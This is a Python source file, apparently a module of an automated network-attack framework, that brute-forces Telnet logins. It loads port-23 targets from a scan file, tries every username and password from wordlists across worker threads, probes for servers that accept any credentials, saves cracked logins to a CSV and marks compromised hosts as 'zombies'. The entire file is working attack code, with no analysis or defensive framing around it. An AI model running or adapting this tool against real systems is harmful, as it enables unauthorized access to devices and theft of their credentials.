"""
telnet_connector.py - This script performs a brute-force attack on Telnet servers using a list of credentials,
and logs the successful login attempts.
"""

import os
import csv
import telnetlib
import threading
import logging
import time
from queue import Queue, Empty
from shared import SharedData
from logger import Logger
from timeout_utils import (
    join_threads_with_timeout,
    drain_queue_safely
)

# Configure the logger
logger = Logger(name="telnet_connector.py", level=logging.INFO)

# Define the necessary global variables
b_class = "TelnetBruteforce"
b_module = "telnet_connector"
b_status = "brute_force_telnet"
b_port = 23
b_parent = None

class TelnetBruteforce:
    """
    Class to handle the brute-force attack process for Telnet servers.
    """
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.telnet_connector = TelnetConnector(shared_data)
        logger.info("TelnetConnector initialized.")

    def bruteforce_telnet(self, ip, port, mac_address='', hostname=''):
        """
        Perform brute-force attack on a Telnet server.
        """
        return self.telnet_connector.run_bruteforce(ip, port, mac_address, hostname)

    def execute(self, ip, port, row, status_key):
        """
        Execute the brute-force attack.
        """
        start_time = time.time()
        logger.lifecycle_start("TelnetBruteforce", ip, port)
        self.shared_data.bjornorch_status = "TelnetBruteforce"
        # Extract hostname and MAC from the row passed by orchestrator
        hostname = row.get('Hostnames', '')
        mac_address = row.get('MAC Address', '')
        try:
            success, results = self.bruteforce_telnet(ip, port, mac_address, hostname)
            status = 'success' if success else 'no_creds_found'
        except Exception as e:
            logger.error(f"Telnet bruteforce error for {ip}: {e}")
            status = 'error'
        finally:
            duration = time.time() - start_time
            logger.lifecycle_end("TelnetBruteforce", status, duration, ip)
        return status

class TelnetConnector:
    """
    Class to handle Telnet connections and credential testing.
    """
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.scan = self._load_csv_filtered(shared_data.netkbfile, "23")

        self.users = open(shared_data.usersfile, "r").read().splitlines()
        self.passwords = open(shared_data.passwordsfile, "r").read().splitlines()

        self.lock = threading.Lock()
        self.telnetfile = shared_data.telnetfile
        # If the file does not exist, it will be created
        if not os.path.exists(self.telnetfile):
            logger.debug(f"Creating {self.telnetfile}")
            with open(self.telnetfile, "w") as f:
                f.write("MAC Address,IP Address,Hostname,User,Password,Port\n")
        self.results = []  # List to store results temporarily
        self.queue = Queue()
        self.progress_lock = threading.Lock()
        self.progress_count = 0
        self.progress_total = 0
        # Shared cache for IPs that allow no-auth access
        self.no_auth_ips = {}
        self.no_auth_lock = threading.Lock()

    def _load_csv_filtered(self, filepath, port_filter):
        """Load CSV and filter rows containing the specified port."""
        rows = []
        if os.path.exists(filepath):
            with open(filepath, 'r', newline='') as f:
                reader = csv.DictReader(f)
                for row in reader:
                    ports = row.get("Ports", "")
                    if ports and port_filter in ports:
                        rows.append(row)
        return rows

    def load_scan_file(self):
        """
        Load the netkb file and filter it for Telnet ports.
        """
        self.scan = self._load_csv_filtered(self.shared_data.netkbfile, "23")

    def _check_no_auth_required(self, adresse_ip):
        """
        Check if telnet allows login without real authentication.
        Returns True if no auth required (should skip credential logging).
        """
        import uuid
        garbage_user = f"test_{uuid.uuid4().hex[:8]}"
        garbage_pass = uuid.uuid4().hex
        try:
            tn = telnetlib.Telnet(adresse_ip, timeout=10)
            tn.read_until(b"login: ", timeout=5)
            tn.write(garbage_user.encode('ascii') + b"\n")
            tn.read_until(b"Password: ", timeout=5)
            tn.write(garbage_pass.encode('ascii') + b"\n")
            time.sleep(1)
            response = tn.expect([b"Login incorrect", b"Password: ", b"\\$ ", b"# "], timeout=5)
            tn.close()
            # If garbage creds get a shell, no real auth required
            if response[0] == 2 or response[0] == 3:
                return True
        except:
            pass
        return False

    def telnet_connect(self, adresse_ip, user, password):
        """
        Establish a Telnet connection and try to log in with the provided credentials.
        Uses 30 second timeout for connection.
        """
        try:
            tn = telnetlib.Telnet(adresse_ip, timeout=30)
            tn.read_until(b"login: ", timeout=5)
            tn.write(user.encode('ascii') + b"\n")
            if password:
                tn.read_until(b"Password: ", timeout=5)
                tn.write(password.encode('ascii') + b"\n")

            # Wait to see if the login was successful
            time.sleep(2)
            response = tn.expect([b"Login incorrect", b"Password: ", b"\\$ ", b"# "], timeout=5)
            tn.close()

            # Check if the login was successful
            if response[0] == 2 or response[0] == 3:
                return True
        except Exception as e:
            pass
        return False

    def worker(self, success_flag):
        """
        Worker thread to process items in the queue.
        Uses graceful shutdown pattern with timeout on queue.get().
        """
        while True:
            if self.shared_data.orchestrator_should_exit:
                break
            try:
                item = self.queue.get(timeout=1.0)
            except Empty:
                if self.queue.empty():
                    break
                continue

            adresse_ip, user, password, mac_address, hostname, port = item
            try:
                if self.telnet_connect(adresse_ip, user, password):
                    with self.lock:
                        self.results.append([mac_address, adresse_ip, hostname, user, password, port])
                        logger.success(f"Found credentials  IP: {adresse_ip} | User: {user} | Password: {password}")
                        success_flag[0] = True
                    # File I/O outside lock
                    self.save_results()
                    self.removeduplicates()
                    self.shared_data.record_zombie(mac_address, adresse_ip)
            finally:
                self.queue.task_done()
                with self.progress_lock:
                    self.progress_count += 1
                    if self.progress_count % 50 == 0:
                        logger.info(f"Bruteforcing Telnet... {self.progress_count}/{self.progress_total}")

    def run_bruteforce(self, adresse_ip, port, mac_address='', hostname=''):
        # Reset no-auth cache for this run
        with self.no_auth_lock:
            self.no_auth_ips = {}

        # Use provided mac_address and hostname from orchestrator (more reliable)
        # Fallback to lookup if not provided
        if not mac_address or not hostname:
            self.load_scan_file()
            for row in self.scan:
                if row.get('IPs') == adresse_ip:
                    if not mac_address:
                        mac_address = row.get('MAC Address', '')
                    if not hostname:
                        hostname = row.get('Hostnames', '')
                    break

        # Check if Telnet doesn't require authentication BEFORE starting bruteforce
        logger.info(f"Checking if Telnet on {adresse_ip} requires authentication...")
        if self._check_no_auth_required(adresse_ip):
            logger.warning(f"Telnet on {adresse_ip} does not require authentication - accepts any credentials!")
            with self.lock:
                self.results.append([mac_address, adresse_ip, hostname, "[ANY]", "[NO AUTH REQUIRED]", port])
            self.save_results()
            self.removeduplicates()
            self.shared_data.record_zombie(mac_address, adresse_ip)
            with self.no_auth_lock:
                self.no_auth_ips[adresse_ip] = True
            return True, self.results  # Return success - we logged the no-auth finding

        total_tasks = len(self.users) * len(self.passwords)
        self.progress_total = total_tasks
        self.progress_count = 0

        for user in self.users:
            for password in self.passwords:
                if self.shared_data.orchestrator_should_exit:
                    logger.info("Orchestrator exit signal received, stopping bruteforce task addition.")
                    return False, []
                self.queue.put((adresse_ip, user, password, mac_address, hostname, port))

        success_flag = [False]
        threads = []

        logger.info(f"Bruteforcing Telnet on {adresse_ip}... (0/{total_tasks})")

        for _ in range(self.shared_data.worker_threads):  # Configurable via shared_config.json
            t = threading.Thread(target=self.worker, args=(success_flag,))
            t.start()
            threads.append(t)

        # Wait for queue with exit signal checking
        queue_timeout = self.shared_data.bruteforce_queue_timeout
        queue_start = time.time()
        while not self.queue.empty():
            if self.shared_data.orchestrator_should_exit:
                logger.info("Orchestrator exit signal received, stopping bruteforce.")
                drain_queue_safely(self.queue)
                break
            if time.time() - queue_start > queue_timeout:
                logger.lifecycle_timeout("TelnetBruteforce", "queue processing", queue_timeout, adresse_ip)
                drain_queue_safely(self.queue)
                break
            time.sleep(0.5)

        # Give workers time to finish current items
        time.sleep(2)

        # Join threads with timeout
        hanging = join_threads_with_timeout(threads, timeout=10, logger=logger)
        if hanging:
            logger.warning(f"Telnet bruteforce: {len(hanging)} threads did not terminate cleanly")

        return success_flag[0], self.results  # Return True and the list of successes if at least one attempt was successful

    def save_results(self):
        """
        Save the results of successful login attempts to a CSV file.
        """
        # Ensure file exists with header
        if not os.path.exists(self.telnetfile):
            with open(self.telnetfile, 'w', newline='') as f:
                f.write("MAC Address,IP Address,Hostname,User,Password,Port\n")
        with open(self.telnetfile, 'a', newline='') as f:
            writer = csv.writer(f)
            for row in self.results:
                writer.writerow(row)
        self.results = []  # Reset temporary results after saving

    def removeduplicates(self):
        """
        Remove duplicate entries from the results file.
        """
        rows = []
        header = None
        if os.path.exists(self.telnetfile):
            with open(self.telnetfile, 'r', newline='') as f:
                reader = csv.reader(f)
                header = next(reader, None)
                seen = set()
                for row in reader:
                    key = tuple(row)
                    if key not in seen:
                        seen.add(key)
                        rows.append(row)

        with open(self.telnetfile, 'w', newline='') as f:
            writer = csv.writer(f)
            if header:
                writer.writerow(header)
            writer.writerows(rows)

if __name__ == "__main__":
    shared_data = SharedData()
    try:
        telnet_bruteforce = TelnetBruteforce(shared_data)
        logger.info("Starting Telnet brute-force attack on port 23...")

        # Load the netkb file and get the IPs to scan
        ips_to_scan = shared_data.read_data()

        # Execute the brute-force attack on each IP
        for row in ips_to_scan:
            ip = row["IPs"]
            logger.info(f"Executing TelnetBruteforce on {ip}...")
            telnet_bruteforce.execute(ip, b_port, row, b_status)

        logger.info(f"Total number of successes: {len(telnet_bruteforce.telnet_connector.results)}")
        exit(len(telnet_bruteforce.telnet_connector.results))
    except Exception as e:
        logger.error(f"Error: {e}")
